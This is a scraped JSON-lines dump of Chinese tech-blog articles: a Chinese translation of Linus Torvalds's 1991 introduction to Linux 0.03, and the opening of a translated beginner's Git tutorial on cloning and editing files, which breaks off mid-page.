<a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,B+Tree,B-Tree,优化,索引", "url": "http://blog.jobbole.com/114041/", "url_obj_id": "821f7f4efb272c0b6522e2a1e27276be"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2014/03/5215e39e39eb546d1689aa26f8d633be.jpg"], "title": "Linus 定义 Linux", "create_date": "2018/07/09 ·", "praise_num": 1, "fav_num": 1, "comment_num": 2, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://oldlinux.org/Linus/\">Linus Torvalds</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/linux-a-free-unix-386-kernel\">开源中国</a>   </div><h1>LINUX介绍</h1>\n<h2>LINUX是什么？</h2>\n<p>LINUX是一个免费类unix内核，适用于386-AT计算机，附带完整源代码。主要让黑客、计算机科学学生使用，学习和享受。它大部分用C编写，但是一小部分是用gnu格式汇编，而且引导序列用的是因特尔086汇编语言。C代码是相对ANSI的，使用一些GNU增强特性（大多为 __asm__ 和 inline）。</p>\n<p>然而有很多可用于386电脑的unices，他们大部分要花很多钱，而且不附带源码。因此他们是使用计算机的理想选择，但是如果你想了解他们如何工作，那是不可能的。</p>\n<p>也有一些  Unix 是附带源码的。Minix，Andrew S. Tanenbaum编写的学习工具，已经在大学中作为教学工具使用了很多年了。BSD-386系统是附带源码的，但是有版权限制，而且要花很多钱（我记得起始价格为$995）。GNU内核（Hurd）将会是免费的，但是现在还没有准备好，而且对于了解和学习它们来说有点庞大。</p>\n<p>LINUX与Minix是最相似的，由于它很小而且不是非常复杂，因此易于理解（嗯…）。LINUX是基于Minix编写的，因此有相当多的相同点，任何Minix黑客在使用LINUX的时候都感觉非常熟悉。不过，没有在项目中使用Minix代码，因此Minix版权没有限制到这个新系统。它也是完全免费的，而且它的版权非常宽松。因此不像使用Minix，它不需要几兆字节大小的区别。</p>\n<h2>LINUX版权</h2>\n<p>虽然是免费的发布版，我还是从以下几个方面限制了LINUX的使用：</p>\n<ul>\n<li>你可以自由复制和重新发布源码和二进制，只要是：</li>\n</ul>\n<ol>\n<li>完全开源。因此不能单独发布二进制，即使你只修改了一点。</li>\n<li>你不能从发布版获取利益。事实上甚至“装卸费用”都是不被接受的。</li>\n<li>你要保持完整的适当版权。</li>\n</ol>\n<ul>\n<li>根据需要你可能会修改源码，但是如果你发布了新系统的一部分（或者只有二进制），必须将新的代码包含进去。</li>\n<li>除了不包含版权的代码之外，你可能会做一些小的修改。这由你来定，但是如果能将相关内容或者代码告诉我，将不胜感激。</li>\n</ul>\n<p>对任何使用或者扩展系统的人来说，这应该足够宽松而不会引起任何担忧。如果你有朋友真的不想要源码，只想要一个能运行的二进制，你当然可以给他而不用担心我会起诉你。不过最好只在朋友之间这么做。</p>\n<h2>LINUX运行所需的硬件/软件</h2>\n<p>LINUX是在一个运行Minix的386-AT上开发的。由于LINUX是一个真正的操作系统，而且需要直接与硬件交互来做一些事情，你必须有一个非常相似的系统来让他顺利运行：</p>\n<ul>\n<li>386-AT（PS/2之类是不同的，不能正常运行）</li>\n<li>VGA或者EGA屏幕硬件。</li>\n<li>标准AT硬盘接口，IDE盘可以运行（实际上我用的就是这个）。</li>\n<li>正常实模式BIOS。一些机器看起来是用虚-86模式运行启动程序，而且在这样的机器LINUX不会启动和正常运行。</li>\n</ul>\n<p>LINUX会发展成为一个自给自足的系统，现在需要Minix-386才能正常运行。你需要Minix让初始化启动文件系统，和编译OS二进制。在那之后LINUX是一个自给自足的系统，但是为了做文件系统检查（fsck）和修改之后重编译系统，推荐使用Minix。</p>\n<h2>获取LINUX</h2>\n<p>LINUX现在可以使用匿名ftp从‘nic.funet.fi’的‘/pub/OS/Linux’目录获取。这个目录包含操作系统的所有源码，还有一些二进制文件，因此你可以真正使用系统了。</p>\n<p><strong>注意！二进制大多是GNU软件，而且版权比LINUX的严格（GNU非盈利性版权）。因此你不能在不发布他们源码的情况下重新发布他们，可以在/pub/GNU中找到。关于GNU非盈利性版权，从任何GNU软件包了解更多。</strong></p>\n<p>此目录中各类文件如下：</p>\n<ul>\n<li>linux-0.03.tar.Z–系统的完全源码，16位tar压缩文件格式。</li>\n<li>Linux.tex–这个文件的LATEX源码。</li>\n<li>bash.Z–在LINUX下运行的bash二进制文件。这个二进制文件应该放到预留给LINUX文件系统中的/bin/sh下（参见installation）。</li>\n<li>update.Z–更新二进制文件，要放到/bin/update。</li>\n<li>gccbin.tar.Z–GNU cc二进制文件需要由一个可运行的编译器。这个tar压缩包含有编译器，加载器，汇编程序和支持程序（nm，strip等）。它还包含一个小型的库，可用于大部分程序。</li>\n<li>include.tar.Z–让gcc运行的必要include文件。</li>\n<li>unistd.tar.Z–unistd库程序的源码（即系统调用接口）。通过这个你可以使用系统独立库源码编译一个大一些的库。</li>\n<li>utilbin.tar.Z–各种GNU工具的二进制文件，包括GNU的fileutils，make和tar。也包含克隆emacs的uemacs。</li>\n<li>README, RELNOTES-0.01, INSTALLATION–包含一些（有点过时的）LINUX相关的信息的ascii文件。</li>\n</ul>\n<p>让系统运行的最少文件是OS源码和bash和更新二进制文件。不过只用这些，你做不了什么事。</p>\n<h2>安装</h2>\n<p>在你拿到了必要LINUX文件之后，你需要编译系统和创建root目录。必要的二进制文件需要放到root文件系统中。按如下操作：<br>\n1. 备份你的软件。虽然LINUX从没有毁坏过我的任何文件，但没有什么是必然的。安全胜过遗憾。<br>\n2. 选择/创建一个标准MinixHD-分区作为新的LINUX root文件系统。<br>\n3. 在新的root创建必要的设备节点。LINUX与Minix使用相同类型的节点，所以使用Minix的mknod命令创建下面的设备：节点号与在Minix中相同。</p>\n<ul>\n<li>/dev/tty</li>\n<li>/dev/tty[0-2]</li>\n<li>/dev/hd[0-9]</li>\n</ul>\n<p>4. 将必要文件放到新的root分区。文件应该放在下面目录中：<br>\n希望你现在有一个功能正常的unix，而且你已经root权限登录。LINUX现在没有‘init’过程，只要你注销，系统会同步并等待。使用三指键（Ctrl+Alt+Del）重启机器。</p>\n<ul>\n<li>gcc</li>\n<li>添加链接到你选择的/usr/local/lib中的文件。我将ld，as，nm，strip和size链接到他们相应的 /usr/local/lib/gcc-XXX。</li>\n<li>gccbin.tar.Z中的内容，除了gcc</li>\n<li>include.tar.Z的内容</li>\n<li>utilbin.tar.Z的内容</li>\n<li>sh，即bash.Z</li>\n<li>update</li>\n<li>/bin:</li>\n<li>/usr/bin:</li>\n<li>/usr/include:</li>\n<li>/usr/local/lib:</li>\n<li>/usr/local/bin:</li>\n<li>编辑系统中的linux/include/linux/config.h。这个文件包含了针对于系统的信息：内存空间，硬盘类型，root分区号（同样的与Minix中的编号相同），键盘类型（现在只有US和Finnish）等。</li>\n<li>编译LINUX源码。一个简单技巧就可以完成，在你编辑makefiles为适合你的系统之后（即，删除-mstring-insnsflag，和修改适合你的路径。）1.40之前版本gcc的用户可能需要添加gnulib到makefile中‘LIBS=’一行。</li>\n<li>复制产生的镜像文件到软盘（即，cp Image /dev/PS0 或者之类的）。</li>\n<li>使用新的软盘重启。启动界面应该告诉你系统正在启动（加载系统…），然后是一些必要的文件系统信息（xxx/XXX inodes/blocks free），接下来是一个确定，还有bash提示（如果你没有.bashrc文件，则初始化bash#）。</li>\n</ul>\n<p><strong>LINUX 缺失/不兼容的东西</strong></p>\n<p>LINUX 是打算作为一个全部自给自足的内核，但现在并非如此。作为上面已经提到的，你需要 Minix 来设置启动设备并且检查文件系统当它运行起来的时候。这里有一些其它的不足之处：</p>\n<p>硬件的不兼容。一些 AT 标准特性当前还没有支持。最值得注意的是软盘驱动，利用 LINUX 进行实际工作（备份 etc）当前是不可能的[译者：这个是 oldlinux，这个是 Linus Torvalds 1991 年 10 月写的文章，肯定当时是不行的]。还有串行连接的一些特性没有被实现（2400 bps 波特率的硬连接，没有挂断（hang-up）提示等等 ）。</p>\n<p>标准 c 库的不兼容。gcc 分发版的 libc.a 没有完成，我对免费可发布的库功能很感兴趣。</p>\n<p>一些系统调用没有完全实现。这些设计绝大多数“极少调用”的特性比如调试（谁无论如何需要它的话，你的程序第一次是无法工作的:-)）以及其它的特性。</p>\n<p>如上所述，没有登陆和初始化进程。当前 LINUX 启动在单用户模式，以 root 作为控制台用户。对于一些移植工作足够了，但不是实际可用的。</p>\n<p>387支持[译者：硬件浮点，当时 Intel 发布了外接式 FPU] 没有被实现，即使已有一些基础程序被提供出来。”nic.funet.fi” 的 gcc 二进制包使用软浮点（ie 仿真功能调用）来支持 4 个基础数学运算操作。387-支持将尽快实现当我的电脑安装了这个硬件。希望在一个月或者两个月。</p>\n<p>现在还没有重要的系统管理命令实现在 LINUX 中。这些包括 mkfs, format, fsck, mknod 等。这些命令需要的内核特性还没有实现（format, mknod），一些命令只需要实现它。作为一个库，我欢迎任何免费分发文件。</p>\n<p>如您所见，LINUX还不是一个完整的系统。 感谢您的帮助，使其变得更好。 我对为LINUX重写的Minix命令不感兴趣，除非你自己从头开始编写它们。 您当然可以免费（并鼓励）将您的Minix发行版中的所有内容用于您自己的LINUX系统，但由于Minix的版权，它们无法分发给更广泛的受众。</p>\n<p>这里提到的一些问题将由我（即lines/387/floppy支持）尽快修复，但我希望得到库函数的支持。感谢你们提交的错误报告及补丁还有愿望清单，如果你真的有针对问题的补丁，我会立即尝试去修复它。 小的更改将作为补丁形式发送到邮件列表，并在<code>nic.funet.fi'上设置，如果经过大量重写，或者修复大的补丁，整个系统将在</code>nic.funet.fi’更新。</p>\n<h2>LINUX移植软件</h2>\n<p>LINUX被设计得让移植相对容易。因此，就有了完整的termios实现和一些POSIX库。我所移植的（诚然相对较少）程序没有任何问题。</p>\n<p>尽管LINUX与Minix非常相似，但Minix程序通常并不会比为其他nuix设计的程序更容易移植。因此，我不建议从一个特定程序的Minix版本开始，而应该尝试从头开始移植‘’virgin‘’程序。比BSD更接近SYSV，这意味着当给定一个-DUSG或者-DSYSV标识时，大多数程序很容易移植。</p>\n<p>移植过程中最困难的一点就是缺少库函数。这些必须由你来编写，或者从其他的来源复制（Minix可能是个有缘人）。另外，一些程序（特别是GNU）有各种各样的标识，这些标识可以定义哪些函数不可用（一旦在Makefile中添加了足够量的-DXXX_MISSING标识，GNU fileutils将编译的很好）。</p>\n<h2>已经移植的程序</h2>\n<p>下面这些程序已经移植到LINUX：</p>\n<ul>\n<li>GNU cc (gcc, cc1, cpp)</li>\n<li>GNU assembler (as386)</li>\n<li>GNU binutils (ld, ar, nm, size, strip, ranlib)</li>\n<li>GNU compress (16-bit)</li>\n<li>GNU tar</li>\n<li>GNU make</li>\n<li>GNU bash (Bourne Again SHell)</li>\n<li>GNU sed</li>\n<li>GNU bison (yacc-lookalike)</li>\n<li>GNU awk</li>\n<li>GNU fileutils (ls, cp, rm, mkdir, rmdir, tail etc)</li>\n<li>less</li>\n<li>uemacs</li>\n</ul>\n<p>所有上述程序都能在‘nic.funet.fi’(主要在’/pub/gnu’)中找到，大多数LIINUX-binaries都可以在‘/pub/OS/Linux’目录中找到。包括gcc（cc1）有一些我自己增强的功能，所有这些程序都在没有变化的情况下编译的。先尝试自己编译，遇到问题可以将差异或者资源发邮件给我。</p>\n<p>另外，我提起过明确地GNU差异编译和运行。</p>\n<h2>技术帮助</h2>\n<p>LINUX目前有一个邮件列表，您可以通过邮件发送到这个地址订阅：<a href=\"mailto:Linux-activists-request@niksula.hut.fi\" rel=\"nofollow\"><strong>Linux-activists-request@niksula.hut.fi</strong></a> ，并要求包括在列表中。然后你可以通过这个邮箱：<a href=\"mailto:Linux-activists@niksula.hut.fi\" rel=\"nofollow\"><strong>Linux-activists@niksula.hut.fi</strong></a> 提问题，这将复制你的问题/答案/无论什么，并发送给列表中其他所有人。</p>\n<p>请注意Linux-activists和Linux0activists-request的不同——第一个用于给列表中的所有人发送邮件，第二个仅用于订阅和取消订阅。</p>\n<p>当然，您也可以直接发送邮件至 <a href=\"mailto:torvalds@kruuna.helsinki.fi\" rel=\"nofollow\"><strong>torvalds@kruuna.helsinki.fi</strong></a>。我会尽量在一两天内回答所有的问题。</p>\n<p>尽管‘nic.funet.fi’可能会保持合理的更新状态，但是它还有些问题（即，我无法因为个人得到文件，但可以通过几个人）。因此，如果邮件列表上的人想要补丁或二进制文件，他们将会更快得到。</p>\n<h2>感谢</h2>\n<p>我要感谢学院…</p>\n<p>说真的，如果没有其他人的帮助，这个系统将永远不会有曙光，甚至会变得更糟。Bruce Evans 帮助我找到了需要更改的位置，以便gcc能正确地处理浮点数，并提供许多有用的想法/建议（他的Minix-386用于构建系统）。此外，Earl Chew 的estdio包被用于标准的IO库。像这样更自由地分发包！</p>\n<p>Alain W Black和Richard Tobin为Minix制作了gcc，没有它我就无法编译这个东西。GNU完成了我在Linux下使用的大部分程序。Alfred Leung发送了美国键盘补丁。</p>\n<p>附：“感谢”<a href=\"mailto:wirzeniu@kruuna.helsinki.fi\" rel=\"nofollow\">wirzeniu@kruuna.helsinki.fi</a>他的“建设性”批评和“诙谐”的评论。他是我第一个<img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/412f23f15ba46a043bbcb30c697e34f7.png\" alt=\"$alpha$\" width=\"14\" height=\"14\">-测试者，他应该被授予勇气奖章。</p>\n<p><strong>Linus Torvalds </strong>(<strong>torvalds@kruuna.helsinki.fi</strong>)<strong>  1991</strong>年<strong>10</strong>月<strong>10</strong>日</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114208\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114208votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114208\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/114208/", "url_obj_id": "d6ec0ef3593f6a22382ac914afc4a27a"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/a9f8e32251fe9ed8030a42ac78ef2343.jpg"], "title": "在 Git 中怎样克隆、修改、添加和删除文件？", "create_date": "2018/06/09 ·", "praise_num": 1, "fav_num": 2, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/2/how-clone-modify-add-delete-git-files\">Kedar Vijay Kulkarni</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9517-1.html\">Linux中国/MjSeven</a>   </div><p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/a9f8e32251fe9ed8030a42ac78ef2343.jpg\"></p>\n<p>在 <a href=\"http://blog.jobbole.com/114101/\">本系列的第一篇文章</a> 开始使用 Git 时，我们创建了一个简单的 Git 仓库，并用我们的计算机连接到它，向其中添加一个文件。在本文中，我们将学习一些关于 Git 的其他内容，即如何克隆（下载）、修改、添加和删除 Git 仓库中的文件。</p>\n<h3 id=\"toc_1\">让我们来克隆一下</h3>\n<p>假设你在 GitHub 上已经有一个 Git 仓库，并且想从它那里获取你的文件——也许你在你的计算机上丢失了本地副本，或者你正在另一台计算机上工作，但是想访问仓库中的文件，你该怎么办？从 GitHub 下载你的文件？没错！在 Git 术语中我们称之为“克隆clone”。（你也可以将仓库作为 ZIP 文件下载，但我们将在本文中探讨克隆方式。）</p>\n<p>让我们克隆在上一篇文章中创建的名为 Demo 的仓库。（如果你还没有创建 Demo 仓库，请跳回到<a href=\"http://blog.jobbole.com/114101/\">那篇文章</a>并在继续之前执行那些步骤）要克隆文件，只需打开浏览器并导航到 <code>https://github.com/&lt;your_username&gt;/Demo</code> (其中 &lt;your_username&gt; <code></code> 是你仓库的名称。例如，我的仓库是 <code>https://github.com/kedark3/Demo</code>)。一旦你导航到该 URL，点击“克隆或下载Clone or download”按钮，你的浏览器看起来应该是这样的：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/c73c351075b2d57e2d8d9b59bc36ac5b.png\" alt=\"\"></p>\n<p>正如你在上面看到的，“使用 HTTPS 克隆Clone with HTTPS”选项已打开。从该下拉框中复制你的仓库地址（<code>https://github.com/&lt;your_username&gt;/Demo.git</code>），打开终端并输入以下命令将 GitHub 仓库克隆到你的计算机：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee6128465376691\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit clone https://github.com/&lt;your_username&gt;/Demo.git\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee6128465376691-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee6128465376691-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee6128465376691-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-r\">clone</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/&lt;your_username&gt;/Demo.git</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee6128465376691-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>然后，要查看 <code>Demo</code> 目录中的文件列表，请输入以下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee6131936746937\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nls Demo/\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee6131936746937-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee6131936746937-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee6131936746937-1\"><span class=\"crayon-e\">ls </span><span class=\"crayon-v\">Demo</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee6131936746937-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>终端看起来应该是这样的：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/bbaf1d51a27e653b3ff50bc5b5fd4034.png\" alt=\"\"></p>\n<h3 id=\"toc_2\">修改文件</h3>\n<p>现在我们已经克隆了仓库，让我们修改文件并在 GitHub 上更新它们。首先，逐个输入下面的命令，将目录更改为 <code>Demo/</code>，检查 <code>README.md</code> 中的内容，添加新的（附加的）内容到 <code>README.md</code>，然后使用 <code>git status</code> 检查状态:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee6136485060291\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncd Demo/\r\nls\r\ncat README.md\r\necho \"Added another line to REAMD.md\" &gt;&gt; README.md\r\ncat README.md\r\ngit status\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee6136485060291-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee6136485060291-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee6136485060291-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee6136485060291-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee6136485060291-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee6136485060291-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee6136485060291-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee6136485060291-1\"><span class=\"crayon-e\">cd </span><span class=\"crayon-v\">Demo</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee6136485060291-2\"><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92ee6136485060291-3\"><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">README</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">md</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee6136485060291-4\"><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Added another line to REAMD.md\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">README</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">md</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92ee6136485060291-5\"><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">README</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">md</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee6136485060291-6\"><span class=\"crayon-e\">git </span><span class=\"crayon-i\">status</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92ee6136485060291-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>如果你逐一运行这些命令，终端看起开将会是这样：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/72ebaab494134e1fef97873629f8df5a.png\" alt=\"\"></p>\n<p>让我们看一下 <code>git status</code> 的输出，并了解它的意思。不要担心这样的语句：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee613c409675198\" class=\"crayon-syntax crayon-theme-github 